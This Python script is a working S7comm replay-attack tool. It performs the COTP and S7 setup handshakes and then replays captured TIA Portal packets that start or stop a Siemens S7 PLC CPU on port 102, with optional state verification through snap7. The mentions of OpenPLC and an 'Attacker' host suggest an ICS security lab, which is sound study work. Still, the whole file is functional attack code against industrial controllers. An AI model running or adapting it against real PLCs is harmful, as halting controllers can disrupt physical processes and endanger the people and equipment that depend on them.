#!/usr/bin/env python3
"""Replay attack: Start/Stop S7 PLC using captured TIA Portal S7comm payloads."""

from __future__ import annotations

import argparse
import socket
import subprocess
import sys
from binascii import hexlify

from payloads import (
    COTP_CR_VARIANTS_HEX,
    CPU_START_PAYLOAD,
    CPU_STOP_PAYLOAD,
    DEFAULT_RACK,
    DEFAULT_SLOT,
    S7_SETUP_HEX,
)


def send_recv(sock: socket.socket, data: bytes | str, recv: bool = True) -> bytes:
    if isinstance(data, str):
        data = bytes.fromhex(data.replace(" ", "").lower())
    sock.send(data)
    if not recv:
        return b""
    return sock.recv(65535)


def cotp_confirmed(response: bytes) -> bool:
    # TPKT (4 bytes) then COTP CC: byte 5 is PDU type 0xD0 (Connect Confirm).
    return len(response) >= 6 and response[5] == 0xD0


def windows_port102_process() -> str | None:
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "(Get-NetTCPConnection -LocalPort 102 -State Listen -ErrorAction SilentlyContinue "
             "| Select-Object -First 1 -ExpandProperty OwningProcess)"],
            capture_output=True,
            text=True,
            timeout=8,
            check=False,
        )
        pid = out.stdout.strip()
        if not pid.isdigit():
            return None
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"(Get-Process -Id {pid} -ErrorAction SilentlyContinue).ProcessName"],
            capture_output=True,
            text=True,
            timeout=8,
            check=False,
        )
        name = proc.stdout.strip()
        return f"PID {pid} ({name})" if name else f"PID {pid}"
    except (OSError, subprocess.TimeoutExpired):
        return None


def port102_hint() -> str:
    owner = windows_port102_process()
    base = (
        "Port 102 must be OpenPLC Runtime (process 'plc_main'), not Siemens 's7oiehsx64'. "
        "Fix (Admin): net stop s7oiehsx64, then restart OpenPLC with S7 server enabled."
    )
    return f"{base} Listener now: {owner}." if owner else base


def connect_cotp(sock: socket.socket, verbose: bool = False) -> str:
    last_resp = b""
    for idx, cotp_hex in enumerate(COTP_CR_VARIANTS_HEX):
        resp = send_recv(sock, cotp_hex)
        if verbose:
            print(f"[*] COTP variant {idx}: response {len(resp)} bytes: "
                  f"{hexlify(resp).decode() or '(empty)'}")
        if cotp_confirmed(resp):
            return cotp_hex
        last_resp = resp
    detail = hexlify(last_resp).decode() if last_resp else "(empty)"
    raise ConnectionError(
        f"COTP Connection Confirm failed (last response: {detail}). {port102_hint()}"
    )


def setup_s7_session(
    ip: str,
    port: int = 102,
    timeout: float = 5.0,
    verbose: bool = False,
) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((ip, port))
    except OSError as exc:
        raise ConnectionError(
            f"Cannot reach {ip}:{port} ({exc}). Is OpenPLC listening on port 102?"
        ) from exc

    connect_cotp(sock, verbose)

    setup_raw = send_recv(sock, S7_SETUP_HEX)
    setup = hexlify(setup_raw).decode()
    if verbose:
        print(f"[*] S7 Setup response: {setup or '(empty)'}")
    if len(setup_raw) < 20 or setup[18:20] != "00":
        sock.close()
        raise ConnectionError(f"S7 Setup Communication failed: {setup or '(empty)'}")

    return sock


def snap7_cpu_state(ip: str, rack: int, slot: int) -> str:
    try:
        import snap7
    except ImportError as exc:
        raise RuntimeError(
            "snap7 not installed. On Attacker: .venv/bin/pip install python-snap7 (see deploy_attacker.py)"
        ) from exc

    client = snap7.client.Client()
    try:
        client.connect(ip, rack, slot)
        return str(client.get_cpu_state())
    finally:
        try:
            client.disconnect()
        except Exception:
            pass


def replay_cpu_command(sock: socket.socket, payload: bytes) -> bytes:
    return send_recv(sock, payload)


def parse_s7_ack(response: bytes) -> tuple[int, int] | None:
    if len(response) < 19:
        return None
    return response[17], response[18]


def run(
    ip: str,
    action: str,
    port: int = 102,
    timeout: float = 5.0,
    verbose: bool = False,
    verify: bool = False,
    rack: int = DEFAULT_RACK,
    slot: int = DEFAULT_SLOT,
    check_only: bool = False,
) -> int:
    state_before = None
    if verify and not check_only:
        state_before = snap7_cpu_state(ip, rack, slot)
        print(f"[*] CPU state before: {state_before}")

    if check_only:
        sock = setup_s7_session(ip, port, timeout, verbose=True)
        sock.close()
        owner = windows_port102_process()
        extra = f" Listener: {owner}." if owner else ""
        print(f"[+] S7 session OK on {ip}:{port}.{extra}")
        if verify:
            print(f"[+] CPU state: {snap7_cpu_state(ip, rack, slot)}")
        return 0

    payload = CPU_START_PAYLOAD if action == "start" else CPU_STOP_PAYLOAD
    if verbose:
        print(f"[*] Target {ip}:{port}, action={action}")
        print(f"[*] Replay payload ({len(payload)} bytes): {payload.hex()}")

    sock = setup_s7_session(ip, port, timeout, verbose)
    try:
        response = replay_cpu_command(sock, payload)
    finally:
        sock.close()

    if verbose and response:
        print(f"[+] S7 response ({len(response)} bytes): {response.hex()}")

    ack = parse_s7_ack(response)
    if ack is None:
        print(f"[-] No valid S7 Ack after {action} (empty or short response)")
        return 1

    err_class, err_code = ack
    if err_class != 0 or err_code != 0:
        print(f"[-] PLC rejected {action}: S7 error class=0x{err_class:02x} code=0x{err_code:02x}")
        return 1

    print(f"[+] S7 Ack OK for {action} (function "
          f"{'0x28' if action == 'start' else '0x29'})")

    if verify:
        state_after = snap7_cpu_state(ip, rack, slot)
        print(f"[+] CPU state after:  {state_after}")
        if state_before is not None:
            expected = "S7CpuStatusRun" if action == "start" else "S7CpuStatusStop"
            if state_after == expected:
                print(f"[+] Verified: CPU is in expected state ({expected})")
            else:
                print(
                    f"[!] Warning: expected {expected} but got {state_after}. "
                    "S7 Ack succeeded; runtime may differ from Siemens PLC."
                )
                return 1

    return 0


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Replay captured TIA Portal Start/Stop CPU packets (S7comm port 102)."
    )
    parser.add_argument("ip", help="PLC IP (e.g. 127.0.0.1 for local OpenPLC)")
    parser.add_argument(
        "action",
        nargs="?",
        choices=("start", "stop"),
        help="start = PLC Control (0x28), stop = PLC Stop (0x29)",
    )
    parser.add_argument("-p", "--port", type=int, default=102)
    parser.add_argument("-t", "--timeout", type=float, default=5.0)
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Read CPU state with snap7 before/after (OpenPLC: rack=0 slot=2)",
    )
    parser.add_argument("--rack", type=int, default=DEFAULT_RACK)
    parser.add_argument("--slot", type=int, default=DEFAULT_SLOT)
    parser.add_argument(
        "--check",
        action="store_true",
        help="Only test TCP + COTP + S7 Setup (no start/stop replay)",
    )
    args = parser.parse_args()

    if args.check:
        args.action = "stop"  # unused
    elif not args.action:
        parser.error("action (start|stop) is required unless --check is used")

    try:
        sys.exit(
            run(
                args.ip,
                args.action or "stop",
                args.port,
                args.timeout,
                args.verbose,
                args.verify,
                args.rack,
                args.slot,
                args.check,
            )
        )
    except (ConnectionError, RuntimeError, TimeoutError, OSError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(2)


if __name__ == "__main__":
    main()
